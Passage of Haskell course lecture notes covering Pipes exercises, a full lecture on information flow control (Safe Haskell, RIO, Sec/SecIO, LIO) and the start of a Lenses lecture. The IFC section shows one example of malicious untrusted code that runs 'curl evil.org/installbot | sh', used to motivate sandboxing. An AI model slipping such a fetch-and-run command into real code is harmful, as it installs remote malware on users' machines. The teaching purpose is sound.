-  This is *not* ad-hoc polymorphism (i.e. type classes)

``(>->)`` and ``cat`` form a ``Category``
=========================================

.. code:: haskell

   (>->) :: Pipe a b IO r  -- (>>>) :: cat a b
         -> Pipe b c IO r  --       -> cat b c
         -> Pipe a c IO r  --       -> cat a c

   cat   :: Pipe a a IO r  -- id    :: cat a a

Associativity:

.. code:: haskell

   (f >-> g) >-> h = f >-> (g >-> h)  -- (f >>> g) >>> h = f >>> (g >> h)

Identity:

.. code:: haskell

   cat >-> f = f                      -- id >>> f = f

   f >-> cat = f                      -- f >>> id = f

API inspired by category theory
===============================

=========== ==========
Composition Identity
=========== ==========
``(>=>)``   ``return``
``(~>)``    ``yield``
``(>~)``    ``await``
``(>->)``   ``cat``
=========== ==========

This is just the beginning:

.. code:: haskell

   (f >=> g) ~> h = (f ~> h) >=> (g ~> h)  -- (x + y) * z = (x * z) + (y * z)

   return ~> h = return                    -- 0 * z = 0

**Goal:** Categorical semantics

Conclusion
==========

-  Composability keeps software architectures flat

-  Small amounts of theory go a very long way

Exercise #1
===========

Implement ``takeWhile``

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn, stdoutLn)
   import Prelude hiding (takeWhile)

   takeWhile :: Monad m => (a -> Bool) -> Pipe a a m ()
   takeWhile keep = ???

   main = runEffect (stdinLn >-> takeWhile (/= "quit") >-> stdoutLn)

::

   >>> main
   Hello<Enter>
   Hello
   CS240H<Enter>
   CS240H
   quit<Enter>
   >>>

Solution #1
===========

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn, stdoutLn)
   import Prelude hiding (takeWhile)

   takeWhile :: Monad m => (a -> Bool) -> Pipe a a m ()
   takeWhile keep = do
       a <- await
       if keep a
           then do
               yield a
               takeWhile keep
           else return ()

   main = runEffect (stdinLn >-> takeWhile (/= "quit") >-> stdoutLn)

Exercise #2
===========

Implement ``map``

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn, stdoutLn)
   import Prelude hiding (map)

   map :: Monad m => (a -> b) -> Pipe a b m ()
   map f = ???

   main = runEffect (stdinLn >-> map (++ "!") >-> stdoutLn)

::

   >>> main
   Hello<Enter>
   Hello!
   CS240H<Enter>
   CS240H!
   ...

Solution #2
===========

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn, stdoutLn)
   import Prelude hiding (map)

   map :: Monad m => (a -> b) -> Pipe a b m ()
   map f = for cat (yield . f)

   main = runEffect (stdinLn >-> map (++ "!") >-> stdoutLn)

::

   cat = forever $ do
       a <- await
       yield a

   for cat (yield . f)

   = forever $ do
       a <- await
       (yield . f) a

   = forever $ do
       a <- await
       yield (f a)

Exercise #3
===========

What does ``mystery`` do?

.. code:: haskell

   import Control.Monad (replicateM_)
   import Pipes

   mystery :: Monad m => Int -> Pipe a a m r
   mystery n = do
       replicateM_ n await
       cat

Solution #3
===========

.. code:: haskell

   import Control.Monad (replicateM_)
   import Pipes

   drop :: Monad m => Int -> Pipe a a m r
   drop n = do
       replicateM_ n await
       cat

::

   >>> runEffect (stdinLn >-> drop 2 >-> stdoutLn)
   A<Enter>
   B<Enter>
   C<Enter>
   C
   D<Enter>
   D
   ...

Exercise #4
===========

What does ``mystery`` do?

.. code:: haskell

   import Pipes

   mystery :: Monad m => Producer String m r
   mystery = return "y" >~ cat

Solution #4
===========

.. code:: haskell

   import Pipes

   yes :: Monad m => Producer String m r
   yes = return "y" >~ cat

Exercise #5
===========

Implement ``grep``

.. code:: haskell

   -- grep.hs

   import Data.List (isInfixOf)
   import Pipes
   import qualified Pipes.Prelude as Pipes

   -- Use: hackage.haskell.org/package/pipes

   grep :: Monad m => String -> Pipe String String m r
   grep str = ???

   main = runEffect (Pipes.stdinLn >-> grep "import" >-> Pipes.stdoutLn)

::

   $ ./grep < grep.hs
   import Pipes
   import qualified Pipes.Prelude as Pipes
   $

Solution #5
===========

.. code:: haskell

   -- grep.hs

   import Data.List (isInfixOf)
   import Pipes
   import qualified Pipes.Prelude as Pipes

   grep :: Monad m => String -> Pipe String String m r
   grep str = Pipes.filter (str `isInfixOf`)

   main = runEffect (Pipes.stdinLn >-> grep "import" >-> Pipes.stdoutLn)


/L12 Information flow control
=============================

Untrusted code
==============

-  Say you want to incorporate untrusted code in a Haskell application

-  Example: Some third-party translation software

   -  You built a web server

   -  Want to add a “translate to Pig Latin” button to each web page

   -  Download some random code with this function

      .. code:: haskell

         toPigLatin :: L.ByteString -> L.ByteString

-  If you could trust the type (no ``IO``), this would be safe to run

   -  Worst case, users get garbled text on web page

-  However, what if you have?

   .. code:: haskell

      toPigLatin = unsafePerformIO $ do
        system "curl evil.org/installbot | sh"
        return "Ia owna ouya"

.. _safe-haskellsafehaskell:

Safe Haskell
============

http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html

-  Starting with GHC 7.2, ``-XSafe`` option enables `Safe
   Haskell <http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html>`__

   -  Courtesy of our very own CA, David Terei

-  Safe Haskell disallows import of any unsafe modules

   -  E.g., can’t import ``System.IO.Unsafe``, so can’t call
      ``unsafePerformIO``

-  Safe imports (enabled by ``-XUnsafe``) require an import to be safe

   .. code:: haskell

      import safe PigLatin (toPigLatin)

   -  The above should guarantee that ``toPigLatin`` doesn’t call unsafe
      functions

-  But wait… doesn’t ``toPigLatin`` use ByteString?

   .. code:: haskell

      head :: {- Lazy -} ByteString -> Word8
      head Empty       = errorEmptyList "head"
      head (Chunk c _) = S.unsafeHead c

      unsafeHead :: {- Strict -} ByteString -> Word8
      unsafeHead (PS x s l) = assert (l > 0) $
          inlinePerformIO $ withForeignPtr x $ \p -> peekByteOff p s

Safe vs. Trustworthy
====================

-  A module compiled ``-XSafe`` can only import safe modules

   -  As if all imports implicitly have ``safe`` keyword

-  But there are *two* kinds of safe module

   1. Modules verified to be safe by the compiler, compiled ``-XSafe``
   2. Modules asserted to be safe by the author, compiled
      ``-XTrustworthy``

-  So a module like ``Data.ByteString`` can be compiled
   ``-XTrustworthy``

   -  Put unsafe functions in separate ``Data.ByteString.Unsafe`` module
   -  Assert ``Data.ByteString`` ’s exported symbols cannot be used
      unsafely, even if the module internally makes use of unsafe
      functions

-  Of course, might or might not trust module author

   -  Can specify on a per-package basis whether to honor
      ``-XTrustworthy``
   -  Flag ``-fpackage-trust`` enables such per-package trust
   -  Use flags, ``-trust`` *Pkg*, ``-distrust`` *Pkg*,
      ``-distrust-all-packages``
   -  Can also set default for a package with ``ghc-pkg``

What if untrusted code needs to do IO?
======================================

-  Suppose you want to translate to a real language

   -  Generally requires massive data sets
   -  Untrusted code would at minimum need to do file IO
   -  Or maybe easiest to send text over network to, e.g., Google
      translate

-  Idea: use a *restricted* IO monad, ``RIO``

   -  Untrusted third party implements ``googleTranslate`` function

      .. code:: haskell

         googleTranslate :: Language -> L.ByteString -> RIO L.ByteString

   -  But uses the ``RIO`` monad, instead of ``IO``

   -  Implement ``RIO`` functions to access network, file system

   -  Have functions reject *dangerous* operations

   -  Can use same names and port ``IO`` code to ``RIO`` by manipulating
      imports

Example: hypothetical ``RIO`` monad
===================================

.. code:: haskell

   {-# LANGUAGE Trustworthy #-}
   module RIO (RIO(), runRIO, RIO.readFile) where

   -- Notice that symbol UnsafeRIO is not exported from this module!
   newtype RIO a = UnsafeRIO (IO a)
   runRIO :: RIO a -> IO a
   runRIO (UnsafeRIO io) = io

   instance Monad RIO where ...

   -- Returns True iff access is allowed to file name
   pathOK :: FilePath -> IO Bool
   pathOK file = -- policy, e.g., only allow files in /tmp

   readFile :: FilePath -> RIO String
   readFile file = UnsafeRIO $ do
     ok <- pathOK file
     if ok then Prelude.readFile file else return ""

-  Note use of ``newtype`` – ``RIO`` is same as ``IO`` at runtime

   -  Anyone can turn an ``RIO`` action into an ``IO`` one with
      ``runRIO``
   -  But can’t create ``RIO`` action from ``IO`` without ``UnsafeRIO``

Exercise: implement RIO Monad instance
======================================

.. code:: haskell

   newtype RIO a = UnsafeRIO (IO a)
   runRIO :: RIO a -> IO a
   runRIO (UnsafeRIO io) = io

-  Starter code: ``wget``
   ```cs240h.stanford.edu/RIO.hs`` <http://cs240h.scs.stanford.edu/RIO.hs>`__

::

   GHCi, version 7.8.2: http://www.haskell.org/ghc/  :? for help
   ...
   *RIO> writeFile "/tmp/hello" "Hello, world\n"
   *RIO> runRIO $ RIO.readFile "/tmp/hello"
   "Hello, world\n"
   *RIO> runRIO $ RIO.readFile "/etc/passwd"
   ""
   *RIO> 

-  Bonus: what’s wrong with the following, alternate definition of
   ``runRIO``?

.. code:: haskell

   newtype RIO a = UnsafeRIO { runRIO :: IO a }

Solutions
=========

.. code:: haskell

   newtype RIO a = UnsafeRIO (IO a)

-  Monad solution:

.. code:: haskell

   instance Monad RIO where
     return = UnsafeRIO . return
     m >>= k = UnsafeRIO $ runRIO m >>= runRIO . k
     fail = UnsafeRIO . fail

-  Bonus solution:

   -  The problem is selectors can be used to *update* state
   -  Exporting ``runRIO`` is tantamount to exporting ``UnsafeRIO``

   .. code:: haskell

      badRIO :: IO a -> RIO a
      badRIO io = (fail "ha ha") { runRIO = io }

   -  Can execute arbitrary ``IO`` actions from within ``RIO``:

   ::

      *Main> runRIO $ badRIO $ putStrLn "gotcha"
      gotcha

Example policies for RIO
========================

-  Only read and write files under some sandbox subdirectory

   -  Protect most of file system from untrusted code

-  Do not allow execution of other programs

   -  Would escape from ``RIO`` restrictions

-  Only allow connections to port 80, and only to known servers

   -  Don’t want untrusted code sending spam, attacking mysql, etc.

-  Do not allow access to devices

   -  Microphone, camera, speaker, etc.

-  Similar to policies that apply to Java/JavaScript in browser

Why RIO isn’t enough
====================

-  What if the web site contains private data, such as email?
-  An attack by malicious ``googleTranslate`` function:

   -  Save a copy of private email under ``/sandbox`` (allowed)
   -  When asked to translate a special string, return stored email
   -  Attacker sends himself an email with special string to read stored
      email

-  Another attack

   -  Send query to attacker’s own website instead of Google

-  Problem: really need to keep track of what information is sensitive

   -  Okay to send public data over network
   -  Not okay to send email (or maybe only okay to send to specific
      Google URL)
   -  Okay to write files, but have to keep track of which files contain
      whose email

-  Solution: Decentralized Information Flow Control (DIFC)

What is DIFC?
=============

|L12image1|

-  IFC originated with military applications and classified data
-  Every piece of data in the system has a label
-  Every process/thread has a label
-  Labels are partially ordered by :math:`\sqsubseteq` (“can flow to”)
-  Example: Emacs (labeled :math:`L_E`) accesses file (labeled
   :math:`L_F`)

.. _what-is-difc-1:

What is DIFC?
=============

|L12image2|

-  IFC originated with military applications and classified data
-  Every piece of data in the system has a label
-  Every process/thread has a label
-  Labels are partially ordered by :math:`\sqsubseteq` (“can flow to”)
-  Example: Emacs (labeled :math:`L_E`) accesses file (labeled
   :math:`L_F`)

   -  File read? Information flows from file to emacs. System requires
      :math:`L_F\sqsubseteq L_E`.

.. _what-is-difc-2:

What is DIFC?
=============

|L12image3|

-  IFC originated with military applications and classified data
-  Every piece of data in the system has a label
-  Every process/thread has a label
-  Labels are partially ordered by :math:`\sqsubseteq` (“can flow to”)
-  Example: Emacs (labeled :math:`L_E`) accesses file (labeled
   :math:`L_F`)

   -  File read? Information flows from file to emacs. System requires
      :math:`L_F\sqsubseteq L_E`.
   -  File write? Information flows in both directions. System enforces
      that :math:`L_F\sqsubseteq L_E` and :math:`L_E\sqsubseteq L_F`.

Labels are transitive
=====================

|L12image4|

-  :math:`\sqsubseteq` is a transitive relation - makes it easier to
   reason about security
-  Example: Label file so it cannot flow to Internet

   -  Policy holds regardless of what other software does

.. _labels-are-transitive-1:

Labels are transitive
=====================

|L12image5|

-  :math:`\sqsubseteq` is a transitive relation - makes it easier to
   reason about security
-  Example: Label file so it cannot flow to Internet

   -  Policy holds regardless of what other software does

-  Suppose a buggy app reads file (e.g., desktop search)

.. _labels-are-transitive-2:

Labels are transitive
=====================

|L12image6|

-  :math:`\sqsubseteq` is a transitive relation - makes it easier to
   reason about security
-  Example: Label file so it cannot flow to Internet

   -  Policy holds regardless of what other software does

-  Suppose a buggy app reads file (e.g., desktop search)

   -  Process labeled :math:`L_\mathrm{bug}` reads file, so must have
      :math:`L_F\sqsubseteq L_\mathrm{bug}`
   -  But :math:`L_F\sqsubseteq L_\mathrm{bug}\wedge
      L_\mathrm{bug}\sqsubseteq L_\mathrm{net}\Longrightarrow
      L_F\sqsubseteq L_\mathrm{net}`, thus
      :math:`L_\mathrm{bug}\> !\sqsubseteq L_\mathrm{net}`

.. _labels-are-transitive-3:

Labels are transitive
=====================

|L12image7|

-  :math:`\sqsubseteq` is a transitive relation - makes it easier to
   reason about security
-  Example: Label file so it cannot flow to Internet

   -  Policy holds regardless of what other software does

-  Conversely, any app that can write to network cannot read file

Labels form a lattice
=====================

|L12image8|

-  Consider two users, :math:`A` and :math:`B`

   -  Label public data :math:`L_\emptyset`, :math:`A` ’s private data
      :math:`L_A`, :math:`B` ’s private data :math:`L_B`

-  What happens if you mix :math:`A` ’s and :math:`B` ’s private data
   in a single document?

   -  Both :math:`A` and :math:`B` should be concerned about the release
      of such a document
   -  Need a label at least as restrictive as both :math:`L_A` and
      :math:`L_B`
   -  Use the least upper bound (a.k.a. *join*) of :math:`L_A` and
      :math:`L_B`, written :math:`L_A\sqcup L_B`

**D** IFC is **D** ecentralized
=================================

|L12image9|

-  Every process has a set of privileges
-  Exercising privilege :math:`p` changes label requirements

   -  :math:`L_F\sqsubseteq_p\> L_\mathrm{proc}` to read, and
      additionally :math:`L_\mathrm{proc}\sqsubseteq_p\> L_F` to write
      file
   -  :math:`\sqsubseteq_p` (\``can flow under privileges :math:`p` ’’)
      is more permissive than :math:`\sqsubseteq`

-  Idea: Set labels so you know who has relevant privs.

Example privileges
==================

|L12image10|

-  Consider again simple two user lattice
-  Let :math:`a` be user :math:`A` ’s privileges, :math:`b` be user
   :math:`B` ’s privileges
-  Clearly :math:`L_A\sqsubseteq_a\>L_\emptyset` and
   :math:`L_B\sqsubseteq_b\>L_\emptyset`

   -  Users should be able to make public or *declassify* their own
      private data

-  Users should also be able to *partially declassify* data

   -  I.e., :math:`L_{AB}\sqsubseteq_a\>L_B` and
      :math:`L_{AB}\sqsubseteq_b\>L_A`

.. _example-privileges-1:

Example privileges
==================

|L12image11|

-  Exercising privileges :math:`a` effectively means:

   -  :math:`L_A` becomes equivalent to :math:`L_\emptyset`
   -  :math:`L_AB` becomes equivalent to :math:`L_B`

The ``Sec`` monad `[Russo]
===========================

- http://www.cse.chalmers.se/~russo/seclib.htm
- http://www.cse.chalmers.se/~russo/eci11/lectures/index.shtml

-  Let’s encode a really simple two-point lattice in Haskell’s type
   system

   -  Let type ``H`` represent secret (“high”) data, and ``L`` public
      (“low”) data

   .. code:: haskell

      {-# LANGUAGE Unsafe #-}
      Module Sec where
      data L = Lpriv
      data H = Hpriv

   -  Type represents secrecy level, constructor represents privileges

   .. code:: haskell

      {-# LANGUAGE Trustworthy #-}
      Module Sec.Safe (module Sec) where
      import Sec (L, H, Sec, sec, open, up)

   -  Let’s also (in module ``Sec``) represent the lattice
      (:math:`L\sqsubseteq H`) in the type system

   .. code:: haskell

      class Flows sl sh where
      instance Flows L L
      instance Flows L H
      instance Flows H H
      -- Notice no instance for Flows H L

The ``Sec`` monad (continued)
=============================

-  Let’s protect secret values with monads by adding to module ``Sec``

   -  Define two monads, ``Sec H`` for high data, and ``Sec L`` for low
      data

   .. code:: haskell

      newtype Sec s a = MkSec a

      instance Monad (Sec s) where
        return x = MkSec x
        MkSec a >>= k = k a

   -  Allow anyone to label a value, but require privileges to unlabel

   .. code:: haskell

      label :: a -> Sec s a
      label x = MkSec x
      unlabel :: Sec s a -> s -> a
      unlabel (MkSec a) s = s `seq` a     -- s (H or L) acts like key

   -  Notice ``seq`` call, ensures “``unlabel undefined secval``” will
      crash
   -  Allow data to be re-labeled according to :math:`\sqsubseteq`
      relation

   .. code:: haskell

      relabel :: (Flows lin lout) => Sec lin a -> Sec lout a
      relabel (MkSec val) = MkSec val

Applying the ``Sec`` monad
==========================

-  Untrusted code gets access to sensitive data only in ``Sec`` monads
-  Possible policy:

   -  Data labeled ``Sec L`` can be sent over network
   -  Data labeled ``Sec H`` can only be sent to Google
   -  Implement by providing specific trusted functions

   .. code:: haskell

      queryGoogle :: Sec H L.ByteString -> IO (Sec H L.ByteString)
      queryGoogle labeledQuery = do
        let query = unlabel Hpriv labeledQuery  -- code is privileged,
        ...                                     -- so have Hpriv

-  This isn’t a very satisfying solution

   -  Decision to query google can’t depend on data
   -  So we aren’t really getting the full benefit of monads (more like
      ``Applicative``)

``IO`` and ``Sec``
==================

-  What if instead we combined ``Sec`` and ``IO``?

   .. code:: haskell

      untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)

   -  Safe to run this computation?

.. _io-and-sec-1:

``IO`` and ``Sec``
==================

-  What if instead we combined ``Sec`` and ``IO``?

   .. code:: haskell

      untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)

   -  Safe to run this computation? **No!**

   .. code:: haskell

      untrustedTranslate secbs = do
        bs <- secbs
        return $ do writeFile "PublicFile" bs -- oops, pwned
                    {- query Google for translation -}

   -  Let’s combine ideas of ``RIO`` and ``Sec`` in a ``SecIO`` monad

   .. code:: haskell

      newtype SecIO s a = MkSecIO (IO (Sec s a))
      instance Monad (SecIO s) where
          return x = MkSecIO (return (return x))
          MkSecIO m >>= k = MkSecIO $ do
            MkSec a <- m
            let MkSecIO m' = k a
            m'
      run :: SecIO s a -> IO (Sec s a)
      run (MkSecIO m) = m

The ``SecIO`` monad
===================

-  Allow ``Sec`` value to be accessed within ``SecIO`` monad:

   .. code:: haskell

      value :: Sec s a -> SecIO s a
      value sa = MkSecIO (return sa)

-  Can return high values from ``SecIO L`` by wrapping in ``Sec``:

   .. code:: haskell

      plug :: Less sl sh => SecIO sh a -> SecIO sl (Sec sh a)

.. raw:: html

   <!--
   * What does `SecIO` mean

       ~~~~ {.haskell}
       -- Can write to high files and returns high Int:
       c1 :: SecIO H Int
       -- Can write to low or high files, returns high Int:
       c2 :: SecIO L (Sec H Int)
       -- Can write to low or high files, returns low Int:
       c3 :: SecIO L Int
       ~~~~
   -->

-  How to represent files (similar for ``IORef`` s, etc.)?

   .. code:: haskell

      -- Must encode level of file in type, path of file in value
      type File s = SecFilePath String

      readFileSecIO :: File s -> SecIO s' (Sec s String)
      writeFileSecIO :: File s -> String -> SecIO s ()

.. raw:: html

   <!--
       * Idea extends to other types of resources (e.g., `IORef`s)
       type DataInvariant a = (a -> IO Bool)
       data Loc t s a b = MkLoc t (DataInvariant a) (DataInvariant a)
       type File s = Loc FilePath s String ()
   -->

``SecIO`` translator
====================

-  Still need privileged function

   .. code:: haskell

      queryGoogle :: Sec H L.ByteString -> SecIO H L.ByteString

   -  Represents the fact that Google is trusted with high data
   -  Makes sense you need to implement this to encode policy

-  Now implement untrusted code as follows

   .. code:: haskell

      untrustedTranslate :: Sec H L.ByteString -> SecIO H L.ByteString

   -  Function can invoke ``queryGoogle``, but not send data to other
      places

-  ``SecIO`` does most enforcement at compile time

-  Problem: for email, really want separate labels for every *user*

   -  Users added dynamically, so hard to encode this with ``Flows`` …

LIO monad `[Stefan]
===========================================================================================

http://www.cse.chalmers.se/~russo/publications_files/haskell11.pdf

-  ``cabal install``
   ```lio`` <http://hackage.haskell.org/package/lio>`__

-  Idea: Let’s keep track of labels *dynamically*, at run time

   -  Track both *current label* and maximum label or *clearance*
   -  Associate an ``LIOState`` with each thread:

   .. code:: haskell

      -- Note type parameter l just specifies the label type
      data LIOState l = LIOState { lioLabel, lioClearance :: !l }

-  Now make ``RIO``-like monad that disallows raw ``IO``

   .. code:: haskell

      {-# LANGUAGE Unsafe #-}

      newtype LIO l a = LIOTCB (IORef (LIOState l) -> IO a)

      instance Monad (LIO l) where
        return = LIOTCB . const . return
        (LIOTCB ma) >>= k = LIOTCB $ \s -> do
          a <- ma s
          case k a of LIOTCB mb -> mb s

   -  So initially, we can’t do *any* IO within ``RIO`` monad

Backdoors for privileged code
=============================

-  Idea: Trustworthy code wraps IO actions with label checks

-  Need some back doors into IO just for Trustworthy code:

   .. code:: haskell

      {-# LANGUAGE Unsafe #-}

      ioTCB :: IO a -> LIO l a -- back door for privileged code
      ioTCB = LIOTCB . const   -- to execute arbitrary IO actions

-  Also handy to have access to state:

   .. code:: haskell

      getLIOStateTCB :: LIO l (LIOState l)
      getLIOStateTCB = LIOTCB readIORef

      putLIOStateTCB :: LIOState l -> LIO l ()
      putLIOStateTCB s = LIOTCB $ \sp -> writeIORef sp $! s

      modifyLIOStateTCB :: (LIOState l -> LIOState l) -> LIO l ()
      modifyLIOStateTCB = getLIOStateTCB >>= putLIOStateTCB . f

-  Note important convention: symbols ending … ``TCB`` never available
   to safe modules

Implementing labels in Haskell
==============================

-  Implementing labels as values is straight-forward:

   .. code:: haskell

      Module LIO.Label

      class (Eq l, Show l, Read l, Typeable l) => Label l where
        lub :: l -> l -> l
        glb :: l -> l -> l
        infixl 5 `lub` `glb`
        canFlowTo :: l -> l -> Bool
        infix 4 `canFlowTo`

-  What about privileges?

   -  Want to know when one privilege subsumes another

   .. code:: haskell

      class (Typeable p, Show p) => SpeaksFor p where
        speaksFor :: p -> p -> Bool

   -  And how privileges affect the :literal:`\`canFlowTo\`` relation

   .. code:: haskell

      class (Label l, SpeaksFor p) => PrivDesc l p where
        downgradeP :: p -> l -> l  -- compute "lowest" equivalent label
        canFlowToP :: p -> l -> l -> Bool
        canFlowToP p l1 l2 = downgradeP p l1 `canFlowTo` l2

Exercise: Implement a ``Label`` instance
========================================

.. code:: haskell

   data Level = Public | Secret | TopSecret
   data Compartment = Nuclear | Crypto
   data MilLabel = MilLabel { level :: Level
                            , compartments :: Set Compartment
                            }

|L12image12|

-  ``wget``
   ```cs240h.stanford.edu/millattice.hs`` <http://cs240h.scs.stanford.edu/millattice.hs>`__
-  Bonus: write some quickcheck properties

Solution
========

-  Label instance

   .. code:: haskell

      instance Label MilLabel where
        lub a b = MilLabel (max (level a) (level b))
                    (Set.union (compartments a) (compartments b))
        glb a b = MilLabel (min (level a) (level b))
                    (Set.intersection (compartments a) (compartments b))
        canFlowTo a b = level a <= level b
                        && compartments a `Set.isSubsetOf` compartments b

-  Some quickcheck instances

   .. code:: haskell

      prop_irreflexive :: MilLabel -> MilLabel -> Bool
      prop_irreflexive l1 l2 =
        if l1 == l2 then l1 `canFlowTo` l2 && l2 `canFlowTo` l1
        else not (l1 `canFlowTo` l2 && l2 `canFlowTo` l1)

      prop_lub :: MilLabel -> MilLabel -> Bool
      prop_lub l1 l2 = l1 `canFlowTo` l3 && l2 `canFlowTo` l3
        where l3 = l1 `lub` l2

Adjusting and checking labels
=============================

-  Before reading any data labeled ``newl``, adjust/check ``LIOState``

   .. code:: haskell

      taint :: Label l => l -> LIO l ()
      taint newl = do
        LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB
        let l' = l `lub` newl
        unless (l' `canFlowTo` c) $ labelError "taint" [newl]
        modifyLIOStateTCB $ \s -> s { lioLabel = l' }

-  Before writing any data labeled ``newl``, adjust/check ``LIOState``

   .. code:: haskell

      guardWrite :: Label l => l -> LIO l ()
      guardWrite newl = do
        LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB
        unless (canFlowTo l newl && canFlowTo newl c) $
          labelError "guardWrite" [newl]
        withContext "guardWrite" $ taint newl

Privileges vs. privilege descriptions
=====================================

-  Want to be able to name/examine privileges in any context

-  *Embody* the privileges by wrapping them with in protected
   ``newtype``

   .. code:: haskell

      newtype Priv a = PrivTCB a deriving (Show, Eq, Typeable)

      instance Monoid p => Monoid (Priv p) where
        mempty = PrivTCB mempty
        mappend (PrivTCB m1) (PrivTCB m2) = PrivTCB $ m1 `mappend` m2

      privDesc :: Priv a -> a
      privDesc (PrivTCB a) = a

   -  Given a ``Priv``, can get a description with ``privDesc``, but not
      vice versa

-  How to create privileges in the first place?

   -  Generate them in ``IO`` at start of program, before invoking
      ``LIO``

   .. code:: haskell

      privInit :: p -> IO (Priv p)
      privInit p = return $ PrivTCB p

   -  Remember, if bad guy can execute arbitrary ``IO`` code, game over
      anyway

Using ``Priv`` Objects
======================

-  Many LIO functions have … ``P`` variants taking privilege

   -  E.g., replace calls to ``taint`` with ones to ``taintP``:

   .. code:: haskell

      taintP :: PrivDesc l p => Priv p -> l -> LIO l ()
      taintP p newl = do
        LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB
        let l' = l `lub` downgradeP p newl
        unless (l' `canFlowTo` c) $ labelErrorP "taintP" p [newl]
        modifyLIOStateTCB $ \s -> s { lioLabel = l' }

-  Can also delegate privileges, wrap them in closures, or check them by
   “gating” closures

   .. code:: haskell

      delegate :: SpeaksFor p => Priv p -> p -> Priv p

      newtype Gate p a = GateTCB (p -> a) deriving Typeable

      gate :: (p -> a) -> Gate p a
      gate = GateTCB

      callGate :: Gate p a -> Priv p -> a
      callGate (GateTCB g) = g . privDesc

Wrapping IO abstractions
========================

-  Many LIO abstractions just LIO ones plus a label

   .. code:: haskell

      data LObj label object = LObjTCB !label !object deriving (Typeable)

-  ``blessTCB`` helper makes constructing LIO functions easy

   -  through the magic of functional dependencies

   .. code:: haskell

      {-# LANGUAGE Trustworthy #-}

      import LIO.TCB.LObj

      type LMVar l a = LObj l (MVar a)

      takeLMVar :: Label l => LMVar l a -> LIO l a
      takeLMVar = blessTCB "takeLMVar" takeMVar

      tryTakeLMVar :: Label l => LMVar l a -> LIO l (Maybe a)
      tryTakeLMVar = blessTCB "tryTakeLMVar" tryTakeMVar

      putLMVar :: Label l => LMVar l a -> a -> LIO l ()
      putLMVar = blessTCB "putLMVar" putMVar

LIO applications
================

-  Main application is `Hails <http://hails.scs.stanford.edu/>`__ web
   framework

   -  Really a framework for creating web *platforms* hosting mutually
      distrustful apps

-  Example: `GitStar <http://gitstar.com/>`__

   -  Host potentially private git repositories
   -  Functionality for, say, syntax-highlighting code cannot exfiltrate
      private sources

-  Ongoing research here at Stanford

.. raw:: html

   <!--

   # Need pure, side-effectful computations

   * Represent labeled pure values with type wrapper

       ~~~~ {.haskell}
       data Labeled l t = LabeledTCB l t
       ~~~~

       * Pure values suitable for mashalling, insertion in database

   * The `LIO l` monad (for `Label l`) is a state monad w. *current* label
       * Current label rises to LUB of all data observed
   * Can label and unlabel pure values in `LIO` monad:

       ~~~~ {.haskell}
       label :: Label l => l -> a -> LIO l (Labeled l a)
       unlabel :: (Label l) => Labeled l a -> LIO l a
       unlabelP :: Priv l p => p -> Labeled l a -> LIO l a
       toLabeled :: (Label l) => l -> LIO l a -> LIO l (Labeled l a)
       ~~~~

       * `label` requires value label to be above current label
       * `unlabel` raises current label to LUB with removed `Labeled`
         (`unlabelP` uses privileges to raise label less)
       * `toLabeled` takes computation that would have raised current
         label, and instead of raising label, wraps result in `Labeled`

   # Other `LIO` features

   * Clearance
       * Special label maintained w. current label in `LIO` state
       * Represents upper bound on current label
       * Can lower clearance to label, but raising requires privileges
       * Allows "need-to-know" policies, reducing danger of covert channels
   * Labeled file system
       * Stores labels along with files
   * Labeled exceptions
       * Can only catch exceptions thrown at points below your clearance
       * Get tainted by exception when you catch it
   * Research in progress to build web framework using `LIO`
       * Allows users to upload untrusted applets into web server

   -->

.. |L12image1| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/lintro.svg
.. |L12image2| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/lread.svg
.. |L12image3| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/lwrite.svg
.. |L12image4| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/trans1.svg
.. |L12image5| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/trans2.svg
.. |L12image6| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/trans3.svg
.. |L12image7| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/trans4.svg
.. |L12image8| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/ablattice.svg
.. |L12image9| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/decentralized.svg
.. |L12image10| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/ablattice.svg
.. |L12image11| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/aequiv.svg
.. |L12image12| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/millattice.svg


/L13 Lenses
==============

Let’s talk about well-behaved Haskell programs for a bit.

So well-typed but non-terminating constructs such as the following are
forbidden:

.. code:: haskell

   loop :: Bool
   loop = loop

   wtf :: Bool
   wtf = undefined

   crash :: Bool
   crash = error "fnord"

Back to basics
==============

How many values can we construct from the following type?

.. code:: haskell

   data Bool = False | True

Ordering
========

Another well-known type:

.. code:: haskell

   data Ordering = LT | EQ | GT

Clearly we can construct three different values of this type.

A zero-valued type
==================

In Haskell 2010, we can create types from which *no* values can be
constructed:

.. code:: haskell

   data Empty

This type has no value constructors (and we can’t use ``deriving``
syntax on it).

“Why?” you may ask. For programming with types while compiling.

Zero, one, two…
===============

So big deal, we can create types with zero or more constructors:

.. code:: haskell

   data Empty

.. code:: haskell

   data One = One

.. code:: haskell

   data Bool = False | True

Adding some parameters
======================

Given these:

.. code:: haskell

   data Ordering = LT | EQ | GT

   data Bool = False | True

Here’s another type to ponder.

.. code:: haskell

   data A = A Bool
          | B Ordering

Spend a minute working out how many values this can have. We’ll do a
quick poll.

Abstracting I
=============

Now how many values can this familiar type have?

.. code:: haskell

   (a,b)

Abstracting II
==============

Now how many values can this familiar type have?

.. code:: haskell

   data Either a b = Left a | Right b

Algebra I
=========

Why do we refer to these as *product* types?

.. code:: haskell

   (a,b,c)

   data Product a b c = Product a b c

They can hold a number of values equal to:

:math:`a \times b \times c`

Algebra II
==========

